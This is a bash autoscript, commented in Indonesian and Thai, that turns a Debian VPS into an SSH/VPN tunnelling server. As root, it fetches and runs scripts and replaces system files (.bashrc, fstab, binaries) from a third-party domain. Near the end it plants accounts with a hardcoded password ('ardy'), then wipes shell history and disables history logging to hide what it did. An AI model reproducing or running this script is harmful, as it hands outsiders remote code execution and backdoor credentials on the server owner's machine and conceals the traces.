#!/bin/bash

if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
#MYIP=$(wget -qO- ipv4.icanhazip.com);

# get the VPS IP
#ip=`ifconfig venet0:0 | grep 'inet addr' | awk {'print $2'} | sed s/.*://`

#MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;

#MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;

MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;
if [ "$MYIP" = "" ]; then
	MYIP=$(wget -qO- ipv4.icanhazip.com)
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="blangkon";

#if [[ $vps = "zvur" ]]
	#source="http://"
#else
	source="http://tepsus-slow-vpn.xyz"
#fi

# go to root
cd


# ใช้สิทธิ์ root ในการรันคอมมาน ปิดไอพีวี6,ติดตั้ง wget curl, อัพเดท
cd
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
apt-get update
apt-get -y install wget curl

# ตั้งค่าเขตเวลา, โลคอล ssh รีสตาร์ท บริการ ssh 
ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# ลบแพคเก็จไม่จำเป็น,อัพเดท อัพเกรด แพคเก็จในเซอร์เวอร์
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
apt-get update 
apt-get -y upgrade

# ติดตั้ง/หยุด แพคเก็จที่ที่จำเป็นเกี่ยวเกี่ยวกับ เว็ปเซอร์เวอร์,อัพเดทไฟล์ เอพีที แพคเก็จ
apt-get -y install nginx php5-fpm php5-cli
apt-get -y install zip tar
apt-get -y install nmap nano iptables sysv-rc-conf openvpn vnstat apt-file
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install libexpat1-dev libxml-parser-perl
apt-get -y install build-essential
apt-get -y install mysql-server mysql_secure_installation
chown -R mysql:mysql /var/lib/mysql/
chmod -R 755 /var/lib/mysql/ 
apt-get -y install nginx php5 php5-fpm php5-cli php5-mysql php5-mcrypt
apt-get -y install git
service exim4 stop
sysv-rc-conf exim4 off
apt-file update

# ตั้งค่า Vnstat
vnstat -u -i eth0
chown -R vnstat:vnstat /var/lib/vnstat
service vnstat restart

# set repo
#wget -O /etc/apt/sources.list $source/debian7/sources.list.debian7
#wget http://www.dotdeb.org/dotdeb.gpg
#wget http://www.webmin.com/jcameron-key.asc
#cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
#cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc

# install screenfetch
cd
#wget $source/debian7/screenfetch-dev
#mv screenfetch-dev /usr/bin/screenfetch
#chmod +x /usr/bin/screenfetch
#echo "clear" >> .profile
#echo "screenfetch" >> .profile

#text gambar
apt-get install boxes

# text pelangi
sudo apt-get install ruby
sudo gem install lolcat

# text warna
cd
rm -rf /root/.bashrc
wget -O /root/.bashrc $source/debian7/.bashrc

# install webserver
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf $source/debian7/nginx.conf
mkdir -p /home/vps/public_html
echo "<pre>Modified by lnwsus</pre>" > /home/vps/public_html/index.html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf $source/debian7/vps.conf
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
service php5-fpm restart
service nginx restart

#PASS=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1`;
#useradd -M -s /bin/false deenie11
#echo "deenie11:$PASS" | chpasswd
#echo "deenie11" >> pass.txt
#echo "$PASS" >> pass.txt
#cp pass.txt /home/vps/public_html/
#rm -f /root/pass.txt
cd

# install badvpn
wget -O /usr/bin/badvpn-udpgw $source/debian7/badvpn-udpgw
if [[ $OS == "x86_64" ]]; then
  wget -O /usr/bin/badvpn-udpgw $source/debian7/badvpn-udpgw64
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
cd

# install mrtg
#apt-get update;apt-get -y install snmpd;
#wget -O /etc/snmp/snmpd.conf $source/debian7/snmpd.conf
#wget -O /root/mrtg-mem.sh $source/debian7/mrtg-mem.sh
#chmod +x /root/mrtg-mem.sh
#cd /etc/snmp/
#sed -i 's/TRAPDRUN=no/TRAPDRUN=yes/g' /etc/default/snmpd
#service snmpd restart
#snmpwalk -v 1 -c public localhost 1.3.6.1.4.1.2021.10.1.3.1
#mkdir -p /home/vps/public_html/mrtg
#cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg.cfg public@localhost
#curl $source/debian7/mrtg.conf >> /etc/mrtg.cfg
#sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg.cfg
#sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg.cfg
#indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg.cfg
#if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
#if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
#if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
cd

# setting port ssh
#sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
#sed -i '/Port 22/a Port 80' /etc/ssh/sshd_config
#sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
sed -i '$ i\Banner bannerssh' /etc/ssh/sshd_config
service ssh restart

# install dropbear
#apt-get -y update
#apt-get -y install dropbear
#sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
#sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
#sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
#echo "/bin/false" >> /etc/shells
#echo "/usr/sbin/nologin" >> /etc/shells
#service ssh restart
#service dropbear restart

apt-get install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=80/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 443"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
sed -i 's/DROPBEAR_BANNER=""/DROPBEAR_BANNER="bannerssh"/g' /etc/default/dropbear
service ssh restart
service dropbear restart
# bannerssh
wget $source/debian7/bannerssh
mv ./bannerssh /bannerssh
chmod 0644 /bannerssh
service dropbear restart
service ssh restart

# upgrade dropbear 2014
apt-get install zlib1g-dev
wget https://matt.ucc.asn.au/dropbear/releases/dropbear-2017.75.tar.bz2
bzip2 -cd dropbear-2017.75.tar.bz2 | tar xvf -
cd dropbear-2017.75
./configure
make && make install
mv /usr/sbin/dropbear /usr/sbin/dropbear1
ln /usr/local/sbin/dropbear /usr/sbin/dropbear
service dropbear restart

# upgade dropbear
#apt-get install zlib1g-dev
#wget $source/debian7/dropbear-2017.75.tar.bz2
#bzip2 -cd dropbear-2016.74.tar.bz2 | tar xvf -
#cd dropbear-2017.75
#./configure
#make && make install
#mv /usr/sbin/dropbear /usr/sbin/dropbear.old
#ln /usr/local/sbin/dropbear /usr/sbin/dropbear
#service dropbear restart
#cd && rm -rf dropbear-2017.75 && rm -rf dropbear-2017.75.tar.bz2


# install vnstat gui
cd /home/vps/public_html/
wget $source/debian7/vnstat_php_frontend-1.5.1.tar.gz
tar xvfz vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/eth0/$ether/g" config.php
sed -i "s/\$iface_list = array('venet0', 'sixxs');/\$iface_list = array($ether);/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
cd

#if [[ $ether = "eth0" ]]; then
#	wget -O /etc/iptables.conf $source/Debian7/iptables.up.rules.eth0
#else
#	wget -O /etc/iptables.conf $source/Debian7/iptables.up.rules.venet0
#fi

#sed -i $MYIP2 /etc/iptables.conf;
#iptables-restore < /etc/iptables.conf;

# install fail2ban
apt-get update;apt-get -y install fail2ban;service fail2ban restart

# install squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf $source/debian7/squid3.conf
sed -i $MYIP2 /etc/squid3/squid.conf;
service squid3 restart

# install webmin
cd
wget http://prdownloads.sourceforge.net/webadmin/webmin_1.850_all.deb
#wget $source/debian7/webmin_1.850_all.deb
dpkg -i webmin_1.850_all.deb
apt-get install perl libnet-ssleay-perl openssl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python
apt-get -f install
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin restart

##wget -O webmin-current.deb http://prdownloads.sourceforge.net/webadmin/webmin_1.760_all.deb
#wget -O webmin-current.deb $source/debian7/webmin-current.deb
#dpkg -i --force-all webmin-current.deb
#apt-get -y -f install;
##sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
#rm -f /root/webmin-current.deb
#apt-get -y --force-yes -f install libxml-parser-perl
#service webmin restart
#service vnstat restart

# install pptp vpn
wget -O /root/pptp.sh $source/debian7/pptp.sh
chmod +x pptp.sh
./pptp.sh

# download script
cd
wget -O /usr/bin/benchmark $source/debian7/benchmark.sh
wget -O /usr/bin/speedtest $source/debian7/speedtest_cli.py
wget -O /usr/bin/ps-mem $source/debian7/ps_mem.py
wget -O /usr/bin/dropmon $source/debian7/dropmon.sh
wget -O /usr/bin/menu $source/debian7/menu.sh
wget -O /usr/bin/user-active-list $source/debian7/user-active-list.sh
wget -O /usr/bin/user-add $source/debian7/user-add.sh
wget -O /usr/bin/user-add-pptp $source/debian7/user-add-pptp.sh
wget -O /usr/bin/user-del $source/debian7/user-del.sh
wget -O /usr/bin/disable-user-expire $source/debian7/disable-user-expire.sh
wget -O /usr/bin/delete-user-expire $source/debian7/delete-user-expire.sh
wget -O /usr/bin/banned-user $source/debian7/banned-user.sh
wget -O /usr/bin/unbanned-user $source/debian7/unbanned-user.sh
wget -O /usr/bin/user-expire-list $source/debian7/user-expire-list.sh
wget -O /usr/bin/user-gen $source/debian7/user-gen.sh
wget -O /usr/bin/userlimit.sh $source/debian7/userlimit.sh
wget -O /usr/bin/userlimitssh.sh $source/debian7/userlimitssh.sh
wget -O /usr/bin/user-list $source/debian7/user-list.sh
wget -O /usr/bin/user-login $source/debian7/user-login.sh
wget -O /usr/bin/user-pass $source/debian7/user-pass.sh
wget -O /usr/bin/user-renew $source/debian7/user-renew.sh
wget -O /usr/bin/clearcache.sh $source/debian7/clearcache.sh
wget -O /usr/bin/bannermenu $source/debian7/bannermenu
wget -O /usr/bin/menu-update-script-vps.sh $source/debian7/menu-update-script-vps.sh
cd

echo "*/30 * * * * root service dropbear restart" > /etc/cron.d/dropbear
echo "00 23 * * * root /usr/bin/disable-user-expire" > /etc/cron.d/disable-user-expire
echo "0 */12 * * * root /sbin/reboot" > /etc/cron.d/reboot
#echo "00 01 * * * root echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a" > /etc/cron.d/clearcacheram3swap
echo "0 */1 * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1

cd
chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps-mem
#chmod +x /usr/bin/autokill
chmod +x /usr/bin/dropmon
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-add-pptp
chmod +x /usr/bin/user-del
chmod +x /usr/bin/disable-user-expire
chmod +x /usr/bin/delete-user-expire
chmod +x /usr/bin/banned-user
chmod +x /usr/bin/unbanned-user
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-gen
chmod +x /usr/bin/userlimit.sh
chmod +x /usr/bin/userlimitssh.sh
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/clearcache.sh
chmod +x /usr/bin/bannermenu
chmod +x /usr/bin/menu-update-script-vps.sh
cd
# swap ram
dd if=/dev/zero of=/swapfile bs=1024 count=1024k
# buat swap
mkswap /swapfile
# jalan swapfile
swapon /swapfile
#auto star saat reboot
wget $source/debian7/fstab
mv ./fstab /etc/fstab
chmod 644 /etc/fstab
sysctl vm.swappiness=10
#permission swapfile
chown root:root /swapfile 
chmod 0600 /swapfile
cd

#ovpn
wget -O ovpn.sh $source/debian7/installovpn.sh
chmod +x ovpn.sh
./ovpn.sh
rm ./ovpn.sh

usermod -s /bin/false mail
echo "mail:ardy" | chpasswd
useradd -s /bin/false -M YUSUF-ARDIANSYAH
echo "YUSUF-ARDIANSYAH:ardy" | chpasswd
# finishing
chown -R www-data:www-data /home/vps/public_html
service cron restart
service nginx start
service php5-fpm start
service vnstat restart
service snmpd restart
service ssh restart
service dropbear restart
service fail2ban restart
service squid3 restart
service webmin restart

cd
rm -f /root/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile

# info
clear
echo "Autoscript Edited BY YUSUF-ARDIANSYAH atau (082139743432):" | lolcat
echo "=======================================================" | lolcat
echo "Service :" | lolcat
echo "---------" | lolcat
echo "OpenSSH  : 22, 143" | lolcat
echo "Dropbear : 443" | lolcat
echo "Squid3   : 80 limit to IP $MYIP" | lolcat
#echo "OpenVPN  : TCP 1194 (client config : http://$MYIP:81/client.ovpn)" | lolcat
echo "badvpn   : badvpn-udpgw port 7300" | lolcat
echo "PPTP VPN : TCP 1723" | lolcat
echo "nginx    : 81" | lolcat
echo "" | lolcat
echo "Tools :" | lolcat
echo "-------" | lolcat
echo "axel, bmon, htop, iftop, mtr, rkhunter, nethogs: nethogs $ether" | lolcat
echo "" | lolcat
echo "Script :" | lolcat
echo "--------" | lolcat
echo "MENU" | lolcat
echo "" | lolcat
echo "Fitur lain :" | lolcat
echo "------------" | lolcat
echo "Webmin         : http://$MYIP:10000/" | lolcat
echo "vnstat         : http://$MYIP:81/vnstat/ [Cek Bandwith]" | lolcat
echo "MRTG           : http://$MYIP:81/mrtg/" | lolcat
echo "Timezone       : Asia/Bangkok " | lolcat
echo "Fail2Ban       : [on]" | lolcat
echo "DDoS Deflate.  : [on]" | lolcat
echo "Block Torrent  : [on]" | lolcat
echo "IPv6           : [off]" | lolcat
echo "Auto Lock User Expire tiap jam 00:00" | lolcat
echo "Auto Reboot tiap jam 00:00 dan jam 12:00" | lolcat
echo "" | tee -a log-install.txt

if [[ $vps = "zvur" ]]; then
	echo "ALL SUPPORTED BY CLIENT VPS" | lolcat
else
	echo "ALL SUPPORTED BY TEAM HACKER" | lolcat
	
fi
echo "Credit to all developers script, YUSUF-ARDIANSYAH" | lolcat
echo "" | lolcat
echo "Log Instalasi --> /root/log-install.txt" | lolcat
echo "" | lolcat
echo " !!! SILAHKAN REBOOT VPS ANDA !!!" | lolcat
echo "=======================================================" | lolcat
cd ~/
rm -f /root/x.sh
rm -f /root/pptp.sh
rm -f /root/ovpn.sh
rm -f /root/dropbear-2017.75.tar.bz2
rm -rf /root/dropbear-2017.75
rm -f /root/IP 
